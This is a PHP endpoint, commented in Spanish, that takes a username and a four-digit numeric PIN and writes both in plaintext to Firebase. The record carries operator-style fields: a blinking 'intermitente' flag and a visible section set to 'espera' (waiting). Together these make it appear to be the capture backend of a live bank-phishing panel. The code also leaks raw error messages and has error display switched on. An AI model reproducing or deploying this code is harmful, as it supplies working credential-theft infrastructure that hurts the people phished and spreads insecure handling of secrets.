<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();

header('Content-Type: application/json; charset=utf-8');

require_once __DIR__ . '/rate_limit.php';


/*
|--------------------------------------------------------------------------
| RATE LIMIT - RÁFAGA
|--------------------------------------------------------------------------
| Máximo 5 consultas nuevas por IP cada 60 segundos.
*/

$limiteRapido = verificarRateLimit(
    'crear_consulta_rapido',
    3,
    60
);

if (!$limiteRapido['permitido']) {

    http_response_code(429);

    header(
        'Retry-After: ' .
        $limiteRapido['retryAfter']
    );

    echo json_encode([
        'error' =>
            'Demasiadas solicitudes. Intenta nuevamente en unos segundos.',

        'retryAfter' =>
            $limiteRapido['retryAfter']
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| RATE LIMIT - SOSTENIDO
|--------------------------------------------------------------------------
| Máximo 20 consultas nuevas por IP cada 30 minutos.
*/

$limiteLargo = verificarRateLimit(
    'crear_consulta_largo',
    20,
    1800
);

if (!$limiteLargo['permitido']) {



    http_response_code(429);

    header(
        'Retry-After: ' .
        $limiteLargo['retryAfter']
    );

    echo json_encode([
        'error' =>
            'Se alcanzó temporalmente el límite de consultas.',

        'retryAfter' =>
            $limiteLargo['retryAfter']
    ]);

    exit;
}

require_once __DIR__ . '/firebase.php';
/*
|--------------------------------------------------------------------------
| RECIBIR DATOS DEL JS
|--------------------------------------------------------------------------
*/

$body = json_decode(
    file_get_contents('php://input'),
    true
);

if (!is_array($body)) {

    http_response_code(400);

    echo json_encode([
        'error' => 'Datos inválidos'
    ]);

    exit;
}


$usuario = trim(
    $body['usuario'] ?? ''
);

$clave = trim(
    $body['clave'] ?? ''
);


/*
|--------------------------------------------------------------------------
| VALIDAR USUARIO
|--------------------------------------------------------------------------
| - Mínimo 8 caracteres
| - Máximo 20 caracteres
| - Solo letras y números
| - Sin espacios
| - Sin signos
| - Debe contener mínimo una letra
| - Debe contener mínimo un número
*/

if ($usuario === '') {

    http_response_code(400);

    echo json_encode([
        'error' => 'Usuario vacío'
    ]);

    exit;
}


if (
    strlen($usuario) < 8 ||
    strlen($usuario) > 20
) {

    http_response_code(400);

    echo json_encode([
        'error' =>
            'El usuario debe tener entre 8 y 20 caracteres'
    ]);

    exit;
}


if (!preg_match('/^[A-Za-z0-9]+$/', $usuario)) {

    http_response_code(400);

    echo json_encode([
        'error' =>
            'El usuario solo puede contener letras y números'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| DEBE CONTENER AL MENOS UNA LETRA
|--------------------------------------------------------------------------
*/

if (!preg_match('/[A-Za-z]/', $usuario)) {

    http_response_code(400);

    echo json_encode([
        'error' =>
            'El usuario debe contener al menos una letra'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| DEBE CONTENER AL MENOS UN NÚMERO
|--------------------------------------------------------------------------
*/

if (!preg_match('/[0-9]/', $usuario)) {

    http_response_code(400);

    echo json_encode([
        'error' =>
            'El usuario debe contener al menos un número'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| VALIDAR CLAVE
|--------------------------------------------------------------------------
| - Exactamente 4 caracteres
| - Solamente números
*/

if ($clave === '') {

    http_response_code(400);

    echo json_encode([
        'error' => 'Clave vacía'
    ]);

    exit;
}


if (!preg_match('/^\d{4}$/', $clave)) {

    http_response_code(400);

    echo json_encode([
        'error' =>
            'La clave debe contener exactamente 4 números'
    ]);

    exit;
}


/*
|--------------------------------------------------------------------------
| CREAR CLIENTE ID
|--------------------------------------------------------------------------
*/

if (!isset($_SESSION['clienteid'])) {

    $_SESSION['clienteid'] =
        bin2hex(random_bytes(16));
}

$clienteid =
    $_SESSION['clienteid'];


/*
|--------------------------------------------------------------------------
| DATOS QUE VAN A FIREBASE
|--------------------------------------------------------------------------
*/

$datos = [

    'clienteid' => $clienteid,

    'usuario' => $usuario,

    'clave' => $clave,

    'color' => 'intermitente',

    'sectionVisible' => 'espera',

    'createdAt' => round(
        microtime(true) * 1000
    ),

    'hora' => date('H:i:s')
];


/*
|--------------------------------------------------------------------------
| ENVIAR A FIREBASE
|--------------------------------------------------------------------------
*/

try {

    $database
        ->getReference(
            '1/' . $clienteid
        )
        ->update($datos);

    $customToken = $auth
        ->createCustomToken($clienteid)
        ->toString();

} catch (Throwable $e) {

    error_log(
        'FIREBASE ERROR: ' .
        $e->getMessage()
    );

    http_response_code(500);

    echo json_encode([
        'error' => $e->getMessage()
    ]);

    exit;
}

/*
|--------------------------------------------------------------------------
| RESPONDER AL JAVASCRIPT
|--------------------------------------------------------------------------
*/

echo json_encode([

    'ok' => true,

    'clienteid' => $clienteid,

    'firebaseToken' => $customToken

]);